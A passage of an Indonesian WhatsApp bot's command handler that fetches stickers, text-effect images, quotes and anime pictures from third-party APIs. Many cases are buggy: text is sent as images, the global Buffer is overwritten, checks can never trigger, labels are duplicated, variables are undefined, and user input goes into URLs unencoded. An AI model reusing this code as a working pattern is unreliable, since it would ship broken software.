				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`_Teksnya Mana Boss_\nContoh ${prefix}attp Wajahku Ganteng`)
				reply (aml.wait)
				attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
				aldi.sendMessage(from, attp2, sticker, {quoted: fkontak})
				await limitAdd(sender)
				break
	case 'thunder':
			    if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 0 ) return reply('Teks nya mana kak?')
				ct = args.join (' ')
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/thunder?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'amongus':
                //[â—] case by DappaGanz
                try {
                if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dpuhy = args.join('  ')
                reply (aml.wait)
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolhuman}&text=${dpuhy}`)
                aldi.sendMessage(from, dapuhy, sticker, {quoted: fkontak})
                await limitAdd(sender)
                } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(ind.error())
				}
                break       
         case 'glow':
				 if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
				 if (isLimit(sender)) return reply(aml.limitend)
				 if (args.length < 0 ) return reply('Teks nya mana kak?')
				 glo = args.join('  ')
				 reply (aml.wait)
				 anu = await fetchJson(`https://api-aldifvnky.herokuapp.com/api/textmaker/metallic?text=${glo}&theme=glow&apikey=${Free}`)
				 memek = await getBuffer(anu.result)
				 aldi.sendMessage(from, memek, image, {quoted: fkontak})
				 await limitAdd(sender)
				 break
	     case 'bokeh':
				 if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
				 if (isLimit(sender)) return reply(aml.limitend)
				 if (args.length < 0 ) return reply('Teks nya mana kak?')
				 ct = args.join (' ')
				 reply (aml.wait)
				 Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/bokeh?apikey=${lolhuman}&text=${ct}`)
				 aldi.sendMessage(from, ct, image, {quoted: fkontak})
				 await limitAdd(sender)
				 break
	case 'strawberry':
				if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 0 ) return reply('Teks nya mana kak?')
				ct = args.join (' ')
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/strawberry?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'metaldark':
			    if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 0 ) return reply('Teks nya mana kak?')
				ct = args.join (' ')
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/metaldark?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {quoted: fkontak})
				await limitAdd(sender)
				break
	case 'cerpen':
			 if (!isGroup) return reply(aml.groupo)
			 if (!isRegistered) return reply(aml.noregis)
		     if (isBanned) return reply(aml.baned)
         	if (isLimit(sender)) return reply(aml.limitend)
             reply (aml.wait)
			anu = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${lolhuman}`)
			aldi.sendMessage(from, `${anu.result}`, text, {quoted: fkontak})
			reply(anu.result.cerpen)
			await limitAdd(sender) 
			break  
			
				case 'quotesdilan':
                if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait)
				anu = await fetchJson(`http://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolhuman}`) 
				jam = `「 QUOTES 」 :\n\n${anu.result}`
				aldi.sendMessage(from, jam, text, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'faktaunik':
                if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait)
				anu = await fetchJson(`http://api.lolhuman.xyz/api/random/faktaunik?apikey=${lolhuman}`) 
				dapzz = `FAKTA UNIK : ${anu.result}`
				aldi.sendMessage(from, dapzz, text, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'katakatabijak':
                if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait)
				anu = await fetchJson(`http://api.lolhuman.xyz/api/random/katabijak?apikey=${lolhuman}`) 
				jam = `「 KATA KATA BIJAK 」 :\n\n${anu.result}`
				aldi.sendMessage(from, jam, text, {quoted: fkontak})
				await limitAdd(sender)
				break
              case 'quotesanime':
              if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait)
				anu = await fetchJson(`http://lolhuman.herokuapp.com/api/random/quotesnime?apikey=${lolhuman}`) 
				jam = `「 QUOTES ANIME 」 :\n\n${anu.result.quote}\n\n*Character* : ${anu.result.character}\n*Episode* : ${anu.result.episode}\n*Anime* : ${anu.result.anime}`
				aldi.sendMessage(from, jam, text, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'randompantun':
                if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait)
				anu = await fetchJson(`http://api.lolhuman.xyz/api/random/pantun?apikey=${lolhuman}`) 
				jam = `「 RANDOM PANTUN 」 :\n\n${anu.result}`
				aldi.sendMessage(from, jam, text, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'randombucin':
                 if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait)
				anu = await fetchJson(`http://api.lolhuman.xyz/api/random/bucin?apikey=${lolhuman}`) 
				jam = `「 RANDOM BUCIN 」 :\n\n${anu.result}`
				aldi.sendMessage(from, jam, text, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'katakatabucin':
                if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait) 
				anu = await fetchJson(`http://api.lolhuman.xyz/api/random/katabucin?apikey=${lolhuman}`) 
				jam = `「 KATA KATA BUCIN 」 :\n\n${anu.result}`
				aldi.sendMessage(from, jam, text, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'randomnama':
                //[❗] case by DappaGanz
			    if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait)
				anu = await fetchJson(`http://api.lolhuman.xyz/api/random/nama?apikey=${lolhuman}`) 
				jam = `「 NAMA 」 :\n\n${anu.result}`
				aldi.sendMessage(from, jam, text, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'memeindo':
				case 'darkjoke':
				case 'estetik':
                //[❗] case by DappaGanz
			    if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
			    if (isLimit(sender)) return reply(aml.limitend)
			    reply (aml.wait)
				anu = await fetchJson(`https://api.lolhuman.xyz/api/meme/memeindo${command}?apikey=${lolhuman}`) 
				oyy = await getBuffer(anu.result)
				aldi.sendMessage(from, oyy, image, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'ceritapendek':
                //[❗] case by DappaGanz
			     if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
			     if (isLimit(sender)) return reply(aml.limitend)
			     reply (aml.wait)
				anu = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolhuman}`)
				t = anu.result
				buffer = await getBuffer(d.thumbnail)
				pndek = `[ CERITA PENDEK ]\n\n\nTitle : ${t.title}\nPengarang : ${t.pengarang}\nKategori : ${t.kategori}\nStory : ${t.story}`
				aldi.sendMessage(from, buffer, image, {quoted: ftoko, caption: pndek})
				await limitAdd(sender)
				break
			case 'quotesimage':
            case 'faktaunik':
            case 'katabijak':
            case 'pantun':
            case 'bucin':
             if (!isGroup) return reply(aml.groupo)
             if (!isRegistered) return reply(aml.noregis)
		     if (isBanned) return reply(aml.baned)
			 if (isLimit(sender)) return reply(aml.limitend)
			 reply (aml.wait)
             get_result = await fetchJson(`http://api.lolhuman.xyz/api/random/${command}?apikey=${lolhuman}`)
             reply(get_result.result)
             await limitAdd(sender)
             break
          case 'randomnama':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/random/nama?apikey=${lolhuman}`)
                    reply(anu.result)
                    await limitAdd(sender)
                    break
		case 'jokerlogo':		
		            if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 0 ) return reply('Teks nya mana kak?')
				    ct = args.join (' ')
				    reply (aml.wait)
				    Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/jokerlogo?apikey=${lolhuman}&text=${ct}`)
				    aldi.sendMessage(from, Buffer, image, {quoted: fkontak})
				    await limitAdd(sender)
				    break
			case 'toxic':
			    if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 0 ) return reply('Teks nya mana kak?')
				ct = args.join (' ')
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/toxic?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, Buffer, image, {quoted: fkontak})
				await limitAdd(sender)
				break
	  case 'bloodfrosted':
				if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 0 ) return reply('Teks nya mana kak?')
				ct = args.join (' ')
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/bloodfrosted?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, Buffer, image, {quoted: fkontak})
				await limitAdd(sender)
				break
				case 'imagetext':
				case 'itext':
				case 'itxt':
				 if (!isGroup) return reply(aml.groupo)
				 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
			     if (isLimit(sender)) return reply(aml.limitend)
                 if (args.length < 1) return reply(`Masukan Teks\nContoh : ${prefix}aldi`)
                 Buffer = await getBuffer(`https://api.vhtear.com/textxgif?text=${args[0]}&apikey=${apivhtear}`).then((response) => {var buf = kontol.from(response, 'base64');
                 aldi.sendMessage(from, Buffer, image, {quoted: ftoko, caption: "DONE BOS✓"})})
                 await limitAdd(sender)
                break
				case 'halloween':
				    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 0 ) return reply('Teks nya mana kak?')
				    reply (aml.wait)
				    ct = args.join (' ')
				    Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/halloween?apikey=${lolhuman}&text=${ct}`)
				    aldi.sendMessage(from, Buffer, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				    await limitAdd(sender)
				    break
				case 'firework':
				    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 0 ) return reply('Teks nya mana kak?')
				    reply (aml.wait)
				    ct = args.join (' ')    
				    Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/fireworksparkle?apikey=${lolhuman}&text=${ct}`)
				    aldi.sendMessage(from, Buffer, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				    await limitAdd(sender)
				    break
				case 'hororblood':
				 if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
				 if (isLimit(sender)) return reply(aml.limitend)
				 if (args.length < 0 ) return reply('Teks nya mana kak?')
				ct = body.slice(11)
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/horrorblood?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {quoted: fkontak})
				await limitAdd(sender)
				break
///////ANIME GE KUMPULKAN DI SNI AE YAAA BIAR KALIAN GO BINGUNG PASS COPAS////
         case 'fuutarou': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=fuutarou`)
					aldi.sendMessage(from, nye, image, { caption: 'fuutarou!!', quoted: mek })
					break 
         case 'itsuki': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=itsuki`)
					aldi.sendMessage(from, nye, image, { caption: 'itsuki!!', quoted: mek })
					break 
         case 'nino': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=nino`)
					aldi.sendMessage(from, nye, image, { caption: 'nino!!', quoted: mek })
					break 
         case 'yotsuba': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=yotsuba`)
					aldi.sendMessage(from, nye, image, { caption: 'yotsuba!!', quoted: mek })
					break 
         case 'naruto': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=naruto`)
					aldi.sendMessage(from, nye, image, { caption: 'naruto!!', quoted: mek })
					break 
         case 'mikasa': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=mikasa`)
					aldi.sendMessage(from, nye, image, { caption: 'mikasa!!', quoted: mek })
					break 
         case 'eren': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=eren`)
					aldi.sendMessage(from, nye, image, { caption: 'eren!!', quoted: mek })
					break 
         case 'titan': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=titan`)
					aldi.sendMessage(from, nye, image, { caption: 'titan!!', quoted: mek })
					break 
         case 'levi': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=levi`)
					aldi.sendMessage(from, nye, image, { caption: 'levi!!', quoted: mek })
					break 
         case 'sakura': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=sakura`)
					aldi.sendMessage(from, nye, image, { caption: 'sakura!!', quoted: mek })
					break 
         case 'hinata': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=hinata`)
					aldi.sendMessage(from, nye, image, { caption: 'hinata!!', quoted: mek })
					break 
         case 'neji': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=neji`)
					aldi.sendMessage(from, nye, image, { caption: 'neji!!', quoted: mek })
					break 
         case 'minato': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=minato`)
					aldi.sendMessage(from, nye, image, { caption: 'minato!!', quoted: mek })
					break 
         case 'jiraya': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=jiraya`)
					aldi.sendMessage(from, nye, image, { caption: 'jiraya!!', quoted: mek })
					break 
         case 'tsunade': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=tsunade`)
					aldi.sendMessage(from, nye, image, { caption: 'tsunade!!', quoted: mek })
					break 
         case 'kiba': 
                    if (!isGroup) return reply(aml.groupo)
                 if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=kiba`)
					aldi.sendMessage(from, nye, image, { caption: 'kiba!!', quoted: mek })
					break 
         case 'armin':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=armin`)
					aldi.sendMessage(from, nye, image, { caption: 'armin!!', quoted: mek })
					break 
        case 'bertholdt':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=bertholdt`)
					aldi.sendMessage(from, nye, image, { caption: 'bertholdt!!', quoted: mek })
					break 
         case 'erwin':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=erwin`)
					aldi.sendMessage(from, nye, image, { caption: 'erwin!!', quoted: mek })
					break 
         case 'loliGz ':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=loliGz `)
					aldi.sendMessage(from, nye, image, { caption: 'loliGz !!', quoted: mek })
					break 
         case 'annie':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=annie`)
					aldi.sendMessage(from, nye, image, { caption: 'annie!!', quoted: mek })
					break 
         case 'hanji':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=hanji`)
					aldi.sendMessage(from, nye, image, { caption: 'hanji!!', quoted: mek })
					break 
         case 'jean':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=jean`)
					aldi.sendMessage(from, nye, image, { caption: 'jean!!', quoted: mek })
					break 
         case 'connie':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=connie`)
					aldi.sendMessage(from, nye, image, { caption: 'connie!!', quoted: mek })
					break 
         case 'historia':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=historia`)
					aldi.sendMessage(from, nye, image, { caption: 'historia!!', quoted: mek })
					break 
         case 'sasha':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=sasha`)
					aldi.sendMessage(from, nye, image, { caption: 'sasha!!', quoted: mek })
					break 
         case 'boruto': 
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=boruto`)
					aldi.sendMessage(from, nye, image, { caption: 'boruto!!', quoted: mek })
					break 
         case 'sarada':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=sarada`)
					aldi.sendMessage(from, nye, image, { caption: 'sarada!!', quoted: mek })
					break 
         case 'sasuke': 
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=sasuke`)
					aldi.sendMessage(from, nye, image, { caption: 'sasuke!!', quoted: mek })
					break 
         case 'madara':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=madara`)
					aldi.sendMessage(from, nye, image, { caption: 'madara!!', quoted: mek })
					break 
         case 'obito': 
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=obito`)
					aldi.sendMessage(from, nye, image, { caption: 'obito!!', quoted: mek })
					break 
         case 'kanao':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=kanao`)
					aldi.sendMessage(from, nye, image, { caption: 'kanao!!', quoted: mek })
					break 
         case 'sayu':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=sayu`)
					aldi.sendMessage(from, nye, image, { caption: 'sayu!!', quoted: mek })
					break 
         case 'yoshida':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=yoshida`)
					aldi.sendMessage(from, nye, image, { caption: 'yoshida!!', quoted: mek })
					break 
         case 'airi': 
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=airi`)
					aldi.sendMessage(from, nye, image, { caption: 'airi!!', quoted: mek })
					break 
         case 'asami':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=asami`)
					aldi.sendMessage(from, nye, image, { caption: 'asami!!', quoted: mek })
					break 
         case 'yuzuha':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=yuzuha`)
					aldi.sendMessage(from, nye, image, { caption: 'yuzuha!!', quoted: mek })
					break 
         case 'luffy': 
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=luffy`)
					aldi.sendMessage(from, nye, image, { caption: 'luffy!!', quoted: mek })
					break 
         case 'hashimoto':
                    if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=hashimoto`)
					aldi.sendMessage(from, nye, image, { caption: 'hashimoto!!', quoted: mek })
					break 
         case 'tanALDII Gz   ': 
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=tanALDII Gz   `)
					aldi.sendMessage(from, nye, image, { caption: 'tanALDII Gz   !!', quoted: mek })
					break 
         case 'nezuko': 
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=nezuko`)
					aldi.sendMessage(from, nye, image, { caption: 'nezuko!!', quoted: mek })
					break 
         case 'ichika':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=ichika`)
					aldi.sendMessage(from, nye, image, { caption: 'ichika!!', quoted: mek })
					break 
         case 'zenitsu':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=zenitsu`)
					aldi.sendMessage(from, nye, image, { caption: 'zenitsu!!', quoted: mek })
					break 
         case 'giyu':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					reply(aml.wait)
					nye = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolhuman}&query=giyu`)
					aldi.sendMessage(from, nye, image, { caption: 'giyu!!', quoted: mek })
					break 
         case 'sakonji':
                 if (!isGroup) return reply(aml.groupo)
                    if (!isRegistered) return reply(aml.noregis)
